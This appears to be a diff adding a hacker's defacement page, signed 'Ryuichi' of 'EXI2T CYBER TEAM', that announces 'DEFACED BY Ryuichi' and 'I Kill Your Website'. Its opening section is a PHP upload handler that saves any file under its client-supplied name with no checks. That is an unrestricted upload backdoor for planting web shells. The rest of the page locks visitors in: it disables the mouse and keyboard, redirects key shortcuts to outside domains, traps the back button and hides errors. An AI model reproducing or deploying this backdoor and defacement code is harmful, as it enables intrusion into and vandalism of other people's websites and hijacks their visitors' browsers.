@@ -1,0 +1,512 @@
+
+<!---
+:"(
+--->
+<html>
+<head>
+  <title>Upload your files</title>
+</head>
+<body>
+  <form enctype="multipart/form-data" action="upload.php" method="POST">
+    <p>Upload your file</p>
+    <input type="file" name="uploaded_file"></input><br />
+    <input type="submit" value="Upload"></input>
+  </form>
+</body>
+</html>
+<?PHP
+  if(!empty($_FILES['uploaded_file']))
+  {
+    $path = "uploads/";
+    $path = $path . basename( $_FILES['uploaded_file']['name']);
+
+    if(move_uploaded_file($_FILES['uploaded_file']['tmp_name'], $path)) {
+      echo "The file ".  basename( $_FILES['uploaded_file']['name']). 
+      " has been uploaded";
+    } else{
+        echo "There was an error uploading the file, please try again!";
+    }
+  }
+?>
+<head>
+<meta name="google-site-verification" content="Ryuichi"/>
+<meta http-equiv="Content-Type" content="text/html; charset=Windows-1254" />
+<title>Maintance !!</title> 
+<link rel="icon" type="image/png" href="http://szablapolska.pl/uploaded/GHz7.png" width="200px" height="200px" type="image/x-icon"/>
+<script>
+function clickIE() {if (document.all) {(message);return false;}}
+function clickNS(e) {if
+(document.layers||(document.getElementById&&!document.all)) {
+if (e.which==2||e.which==3) {(message);return false;}}}
+if (document.layers)
+{document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+document.oncontextmenu=new Function("return false")
+function clickIE4(){if (event.button==2){close();return false;}} function clickNS4(e){if (document.layers||document.getElementById&&!document.all){if (e.which==2||e.which==3){close();return false;}}} if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS4;} else if (document.all&&!document.getElementById){document.onmousedown=clickIE4;} document.oncontextmenu=new Function("close();return false")
+</script>
+<iframe width="0" height="0" src="https://api.soundcloud.com/tracks/209212568/stream?client_id=a3e059563d7fd3372b49b37f00a00bcf" frameborder="0" allowfullscreen></iframe>
+<meta name="description"content="EXI2T CYBER TEAM">
+<meta name="Author" content="Ryuichi"/>
+<meta name="keywords" content="Ryuichi"/>
+<meta name="googlebot" content="index, follow, nosnippet, noarchive"/>
+<meta name="google" content="notranslate"/>
+<meta property="og:image" content="https://i.pinimg.com/originals/71/31/ed/7131ed0d0b402427f37623ea4dcbe09c.jpg">
+<link itemprop="thumbnailUrl" href="https://i.pinimg.com/originals/71/31/ed/7131ed0d0b402427f37623ea4dcbe09c.jpg">
+<script type="text/javascript"> 
+//<![CDATA[
+shortcut={all_shortcuts:{},add:function(a,b,c){var d={type:"keydown",propagate:!1,disable_in_input:!1,target:document,keycode:!1};if(c)for(var e in d)"undefined"==typeof c[e]&&(c[e]=d[e]);else c=d;d=c.target,"string"==typeof c.target&&(d=document.getElementById(c.target)),a=a.toLowerCase(),e=function(d){d=d||window.event;if(c.disable_in_input){var e;d.target?e=d.target:d.srcElement&&(e=d.srcElement),3==e.nodeType&&(e=e.parentNode);if("INPUT"==e.tagName||"TEXTAREA"==e.tagName)return}d.keyCode?code=d.keyCode:d.which&&(code=d.which),e=String.fromCharCode(code).toLowerCase(),188==code&&(e=","),190==code&&(e=".");var f=a.split("+"),g=0,h={"`":"~",1:"!",2:"@",3:"#",4:"$",5:"%",6:"^",7:"&",8:"*",9:"(",0:")","-":"_","=":"+",";":":","'":'"',",":"<",".":">","/":"?","":"|"},i={esc:27,escape:27,tab:9,space:32,"return":13,enter:13,backspace:8,scrolllock:145,scroll_lock:145,scroll:145,capslock:20,caps_lock:20,caps:20,numlock:144,num_lock:144,num:144,pause:19,"break":19,insert:45,home:36,"delete":46,end:35,pageup:33,page_up:33,pu:33,pagedown:34,page_down:34,pd:34,left:37,up:38,right:39,down:40,f1:112,f2:113,f3:114,f4:115,f5:116,f6:117,f7:118,f8:119,f9:120,f10:121,f11:122,f12:123},j=!1,l=!1,m=!1,n=!1,o=!1,p=!1,q=!1,r=!1;d.ctrlKey&&(n=!0),d.shiftKey&&(l=!0),d.altKey&&(p=!0),d.metaKey&&(r=!0);for(var s=0;k=f[s],s<f.length;s++)"ctrl"==k||"control"==k?(g++,m=!0):"shift"==k?(g++,j=!0):"alt"==k?(g++,o=!0):"meta"==k?(g++,q=!0):1<k.length?i[k]==code&&g++:c.keycode?c.keycode==code&&g++:e==k?g++:h[e]&&d.shiftKey&&(e=h[e],e==k&&g++);if(g==f.length&&n==m&&l==j&&p==o&&r==q&&(b(d),!c.propagate))return d.cancelBubble=!0,d.returnValue=!1,d.stopPropagation&&(d.stopPropagation(),d.preventDefault()),!1},this.all_shortcuts[a]={callback:e,target:d,event:c.type},d.addEventListener?d.addEventListener(c.type,e,!1):d.attachEvent?d.attachEvent("on"+c.type,e):d["on"+c.type]=e},remove:function(a){var a=a.toLowerCase(),b=this.all_shortcuts[a];delete this.all_shortcuts[a];if(b){var a=b.event,c=b.target,b=b.callback;c.detachEvent?c.detachEvent("on"+a,b):c.removeEventListener?c.removeEventListener(a,b,!1):c["on"+a]=!1}}},
+shortcut.add("esc",function(){top.location.href="https://ghztujuh.co.id/"});
+shortcut.add("Ctrl+Shift+Del",function(){top.location.href="https://ghztujuh.co.id/"});
+shortcut.add("Ctrl+F",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+W",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+U",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+A",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+S",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+X",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+C",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+V",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+Y",function(){top.location.href="https://ghztujuh.com/"});
+shortcut.add("Ctrl+Z",function(){top.location.href="https://ghztujuh.com/"});
+//]]>
+</script>
+<script type="text/javascript">
+//<![CDATA[
+var kontol = new Array() //:'(
+kontol[0] = "Maintance !!";
+var reps = 0
+var speed = 0
+var p=kontol.length;
+var T="";
+var C=0;
+var mC=0;
+var s=1;
+var sT=null;
+if(reps<1)reps=1;
+function doTheThing(){
+T=kontol[mC];
+A();}
+function A(){
+s++
+if(s>9){s=1}
+if(s==1){document.title='-=['+T+']=-'}
+if(s==2){document.title='.:['+T+']:.'}
+if(C<(11*reps)){
+sT=setTimeout("A()",speed);
+C++
+}else{
+C=0;
+s=0;
+mC++
+if(mC>p-1)mC=0;
+sT=null;
+doTheThing();}}
+doTheThing();
+//]]>
+</script>
+</head> 
+<body bgcolor='black' oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>
+<link href="https://fonts.googleapis.com/css?family=Chela+One|Eater|Geostar|Geostar+Fill|Hanalei|Kumar+One+Outline|Nosifer|Sirin+Stencil" rel="stylesheet">
+<script type="text/javascript">
+(function () {
+    var t = (function () {
+        var z = navigator.appVersion.toLowerCase();
+        z = (z.indexOf("msie") > -1) ? parseInt(z.replace(/.*msie[ ]/, "").match(/^[0-9]+/)) : 0;
+        return {
+            ltIE6: z <= 6 && z != 0,
+            ltIE7: z <= 7 && z != 0,
+            ltIE8: z <= 8 && z != 0,
+            ltIE9: z <= 9 && z != 0,
+            ie: z != 0,
+            firefox: window.globalStorage,
+            opera: window.opera,
+            webkit: !document.uniqueID && !window.opera && !window.globalStorage && window.localStorage,
+            mobile: /android|iphone|ipad|ipod/i.test(navigator.userAgent.toLowerCase())
+        }
+    })();
+    var o = "codes";
+    var g = 100;
+    var u = 2;
+    var s = 1000;
+    var q = 3;
+    var w = 1;
+    var v = 0;
+    var y = "png";
+    var j = "http://htmlfreecodes.com/";
+    var b = j + o + "/";
+    var k = document.body;
+    var c = "#FFFFFF" + o;
+    var e = new Date().getTime();
+    var d = 0;
+    var f = 20;
+    var l = 50;
+    var p = 1000;
+    var a = false;
+    var r = new Array();
+    var n = new Array();
+    var x = 0;
+    var h = {
+        x: 0,
+        y: 0
+    };
+    window[c] = {
+        init: function () {
+            for (i = 0; i < g; i++) {
+                var A = document.createElement("div");
+                A.style.position = "fixed";
+                A.style.overflow = "hidden";
+                A.style.visibility = "hidden";
+                A.style.top = 50;
+                A.style.left = 50;
+                A.style.zIndex = p + i;
+                var z = document.createElement("img");
+                z.style.border = "0";
+                A.appendChild(z);
+                k.appendChild(A);
+                r[i] = {
+                    obj: A,
+                    img: z,
+                    action: 0,
+                    from: h,
+                    to: h,
+                    begin: 5,
+                    duration: 0
+                }
+            }
+            for (i = 0; i < u; i++) {
+                n[i] = new Image();
+                n[i].src = b + "b" + (i + 1) + "." + y + (v == 1 ? "?" + e : "")
+            }
+            m.action();
+            x = setInterval(m.action, d)
+        },
+        action: function () {
+            if (!a) {
+                for (C = 0; C < u; C++) {
+                    if (n[C].height == 0) {
+                        return
+                    }
+                }
+                a = true
+            }
+            var A = {
+                height: m.getViewHeight(),
+                width: m.getViewWidth(),
+                top: 0,
+                bottom: m.getViewHeight()
+            };
+            for (var C = 0; C < g; C++) {
+                switch (r[C].action) {
+                case 0:
+                    if (m.getRandomNum(l) == 0) {
+                        var B = n[m.getRandomNum(u)];
+                        r[C].img.src = B.src;
+                        var z = m.getRandomNum(A.width - B.width);
+                        r[C].from = {
+                            x: z,
+                            y: 0
+                        };
+                        r[C].to = {
+                            x: z,
+                            y: A.height
+                        };
+                        r[C].begin = new Date() - 0;
+                        r[C].duration = A.height * f / s;
+                        if (q > 0) {
+                            r[C].duration *= (1 + (0.1 * (m.getRandomNum(2) == 0 ? 1 : -1) * m.getRandomNum(q)))
+                        }
+                        r[C].action = 1;
+                        m.move(r[C].obj, r[C].from);
+                        m.setVisible(r[C].obj)
+                    }
+                    break;
+                case 1:
+                    var D = new Date() - r[C].begin;
+                    if (D < r[C].duration) {
+                        m.move(r[C].obj, m.easingPos(D, r[C].from, r[C].to, r[C].duration))
+                    } else {
+                        m.setHidden(r[C].obj);
+                        r[C].action = 0
+                    }
+                    break
+                }
+            }
+        },
+        getRandomNum: function (z) {
+            return Math.floor(Math.random() * z)
+        },
+        getViewHeight: function () {
+            if (window.innerHeight) {
+                return window.innerHeight
+            }
+            if (document.documentElement && document.documentElement.clientHeight) {
+                return document.documentElement.clientHeight
+            } else {
+                if (document.body && document.body.clientHeight) {
+                    return document.body.clientHeight
+                }
+            }
+            return 0
+        },
+        getViewWidth: function () {
+            if (window.innerWidth) {
+                return window.innerWidth
+            }
+            if (document.documentElement && document.documentElement.clientWidth) {
+                return document.documentElement.clientWidth
+            } else {
+                if (document.body && document.body.clientWidth) {
+                    return document.body.clientWidth
+                }
+            }
+            return 0
+        },
+        getViewTop: function () {
+            if (window.scrollY) {
+                return window.scrollY
+            }
+            if (window.pageYOffset) {
+                return window.pageYOffset
+            }
+            if (document.documentElement && document.documentElement.scrollTop) {
+                return document.documentElement.scrollTop
+            } else {
+                if (document.body && document.body.scrollTop) {
+                    return document.body.scrollTop
+                }
+            }
+            return 0
+        },
+        getViewBottom: function () {
+            return m.getViewTop() + m.getViewHeight()
+        },
+        getViewLeft: function () {
+            if (window.scrollX) {
+                return window.scrollX
+            }
+            if (window.pageXOffset) {
+                return window.pageXOffset
+            }
+            if (document.documentElement && document.documentElement.scrollLeft) {
+                return document.documentElement.scrollLeft
+            } else {
+                if (document.body && document.body.scrollLeft) {
+                    return document.body.scrollLeft
+                }
+            }
+            return 0
+        },
+        getViewRight: function () {
+            return m.getViewLeft() + m.getViewWidth()
+        },
+        easing: function (A, C, B, z) {
+            return (B - C) * A / z + C
+        },
+        easingPos: function (A, C, B, z) {
+            return {
+                x: m.easing(A, C.x, B.x, z),
+                y: m.easing(A, C.y, B.y, z)
+            }
+        },
+        move: function (z, A) {
+            z.style.top = A.y + "px";
+            z.style.left = A.x + "px"
+        },
+        setHidden: function (z) {
+            z.style.visibility = "hidden"
+        },
+        setVisible: function (z) {
+            z.style.visibility = "visible"
+        }
+    };
+    var m = window[c];
+    m.init()
+})();
+</script>
+<style>
+.Ryuichi{
+font-weight:bold;
+}
+#Ryuichi-GANS{
+    position:relative;
+    top:0px 0px;
+}
+</style>
+<table width=100% height=100%>
+<td align=center>
+<div class="container">
+       <div class="text">
+  <h1 style="font-family: 'Nosifer', cursive;color:white;" class="heading" data-target-resolver></h1>
+</div></div><br/><h2 style="font-family: 'Sirin Stencil', cursive;">[BeamSipit12@gmail.com]</h2>
+
+<svg xmlns="http://www.w3.org/2000/svg" version="1.1">
+    <defs>
+      <filter id="glitch" x="0" y="0">
+          <feColorMatrix in="SourceGraphic" mode="matrix" values="1 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 1 0" result="r" />
+            
+        <feOffset in="r" result="r" dx="-5">
+          <animate attributeName="dx" attributeType="XML" values="0; -5; 0; -18; -2; -4; 0 ;-3; 0" dur="0.2s" repeatCount="indefinite"/>
+        </feOffset>
+        <feColorMatrix in="SourceGraphic" mode="matrix" values="0 0 0 0 0  0 1 0 0 0  0 0 0 0 0  0 0 0 1 0" result="g"/>
+        <feOffset in="g" result="g" dx="-5" dy="1">
+          <animate attributeName="dx" attributeType="XML" values="0; 0; 0; -3; 0; 8; 0 ;-1; 0" dur="0.15s" repeatCount="indefinite"/>
+        </feOffset>
+        <feColorMatrix in="SourceGraphic" mode="matrix" values="0 0 0 0 0  0 0 0 0 0  0 0 1 0 0  0 0 0 1 0" result="b"/>
+        <feOffset in="b" result="b" dx="5" dy="2">
+          <animate attributeName="dx" attributeType="XML" values="0; 3; -1; 4; 0; 2; 0 ;18; 0" dur="0.35s" repeatCount="indefinite"/>
+        </feOffset>
+        <feBlend in="r" in2="g" mode="screen" result="blend" />
+        <feBlend in="blend" in2="b" mode="screen" result="blend" />
+      </filter>
+    </defs>
+</svg>
+<script langue="javascript" type="text/javascript">
+history.pushState(null, null, location.href);
+    window.onpopstate = function () {
+        history.go(1);
+    };
+</script>
+<script language="JavaScript1.2" type="text/javascript">
+function ClearError() {return true;}
+window.onerror = ClearError;
+</script>
+</center> 
+<style type="text/css">
+body { background-color: black; background-image: url("https://s2.ezgif.com/tmp/ezgif-2-ca9245da37.png"); background-repeat: no-repeat; background-size: 100% 100%; }
+h2 {
+position:absolute;
+    bottom:0px;
+    font-size:20px;
+    color:white;
+    
+}
+.text {
+  -webkit-filter: url("#glitch");
+  filter: url("#glitch");
+}
+
+.text {
+  display: inline-block;
+}
+h1 {
+color:red;
+}
+* {
+  box-sizing: border-box;
+}
+.container {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  height: 100%;
+  padding: 5rem;
+}
+
+.heading {
+  color: #eee;
+  font-size: 30px;
+  font-weight: 300;
+  text-transform: uppercase;
+}
+</style>
+<script type="text/javascript" league="javascript">
+var resolver = {
+  resolve: function resolve(options, callback) {
+    // The string to resolve
+    var resolveString = options.resolveString || options.element.getAttribute('data-target-resolver');
+    var combinedOptions = Object.assign({}, options, { resolveString: resolveString });
+
+    function getRandomInteger(min, max) {
+      return Math.floor(Math.random() * (max - min + 1)) + min;
+    };
+
+    function randomCharacter(characters) {
+      return characters[getRandomInteger(0, characters.length - 1)];
+    };
+
+    function doRandomiserEffect(options, callback) {
+      var characters = options.characters;
+      var timeout = options.timeout;
+      var element = options.element;
+      var partialString = options.partialString;
+
+      var iterations = options.iterations;
+
+      setTimeout(function () {
+        if (iterations >= 0) {
+          var nextOptions = Object.assign({}, options, { iterations: iterations - 1 });
+
+          // Ensures partialString without the random character as the final state.
+          if (iterations === 0) {
+            element.textContent = partialString;
+          } else {
+            // Replaces the last character of partialString with a random character
+            element.textContent = partialString.substring(0, partialString.length - 1) + randomCharacter(characters);
+          }
+
+          doRandomiserEffect(nextOptions, callback);
+        } else if (typeof callback === "function") {
+          callback();
+        }
+      }, options.timeout);
+    };
+
+    function doResolverEffect(options, callback) {
+      var resolveString = options.resolveString;
+      var characters = options.characters;
+      var offset = options.offset;
+      var partialString = resolveString.substring(0, offset);
+      var combinedOptions = Object.assign({}, options, { partialString: partialString });
+
+      doRandomiserEffect(combinedOptions, function () {
+        var nextOptions = Object.assign({}, options, { offset: offset + 1 });
+
+        if (offset <= resolveString.length) {
+          doResolverEffect(nextOptions, callback);
+        } else if (typeof callback === "function") {
+          callback();
+        }
+      });
+    };
+
+    doResolverEffect(combinedOptions, callback);
+  }
+
+  /* Some GLaDOS quotes from Portal 2 chapter 9: The Part Where He Kills You
+   * Source: http://theportalwiki.com/wiki/GLaDOS_voice_lines#Chapter_9:_The_Part_Where_He_Kills_You
+   */
+};var strings = ['DEFACED BY Ryuichi', 'your System not Safe ', 'I Kill Your Website'];
+
+var counter = 0;
+
+var options = {
+  // Initial position
+  offset: 0,
+  // Timeout between each random character
+  timeout: 5,
+  // Number of random characters to show
+  iterations: 10,
+  // Random characters to pick from
+  characters: ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'x', 'y', 'x', '#', '%', '&', '-', '+', '_', '?', '/', '\\', '='],
+  // String to resolve
+  resolveString: strings[counter],
+  // The element
+  element: document.querySelector('[data-target-resolver]')
+
+  // Callback function when resolve completes
+};function callback() {
+  setTimeout(function () {
+    counter++;
+
+    if (counter >= strings.length) {
+      counter = 0;
+    }
+
+    var nextOptions = Object.assign({}, options, { resolveString: strings[counter] });
+    resolver.resolve(nextOptions, callback);
+  }, 1000);
+}
+
+resolver.resolve(options, callback);
+</script>
+</body>
+</html>
